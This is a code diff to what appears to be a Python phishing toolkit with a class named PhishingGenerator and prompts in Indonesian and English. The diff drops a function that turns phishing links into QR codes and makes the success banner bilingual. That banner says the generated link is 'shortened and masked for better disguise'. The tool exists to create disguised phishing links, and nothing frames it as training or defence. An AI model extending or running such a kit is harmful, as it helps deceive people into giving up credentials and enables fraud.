@@ -8,7 +8,6 @@ import subprocess
 import tarfile
 import time
 import zipfile
-import urllib.parse
 import threading
 import requests
 import logging
@@ -556,14 +555,6 @@ class PhishingGenerator:
         except:
             pass
 
-    def generate_qr(self, url):
-        try:
-            encoded = urllib.parse.quote(url, safe='')
-            qr_url = f"https://api.qrserver.com/v1/create-qr-code/?size=200x200&data={encoded}"
-            console.print(Panel(f"[cyan]📱 QR Code for phishing link:[/]\n[underline]{qr_url}[/]\n[yellow]Scan to open the link[/]"))
-        except:
-            pass
-
     def select_language(self):
         """Pilih bahasa aplikasi"""
         self.clear_screen()
@@ -969,17 +960,12 @@ class PhishingGenerator:
             console.print(Panel(f"""
 [cyan]🎣 Link Phishing Berhasil Dibuat![/]
     
-[yellow]Original URL:[/]
-{phish_url}
-
-[yellow]Shortened URL:[/]
+[yellow]{'Phishing URL' if self.language == 'en' else 'URL Phishing'}:[/]
 {shortened_url}
 
-[green]✨ Link telah dipersingkat dan dimasker untuk penyamaran yang lebih baik![/]
-[red]⚠️ Link akan tetap aktif hingga program ditutup[/]
+[green]✨ {'Link has been shortened and masked for better disguise!' if self.language == 'en' else 'Link telah dipersingkat dan dimasker!'}[/]
+[red]⚠️ {'Link will stay active until program is closed' if self.language == 'en' else 'Link akan tetap aktif hingga program ditutup'}[/]
             """))
-            
-            self.generate_qr(shortened_url)
             
             return shortened_url
             
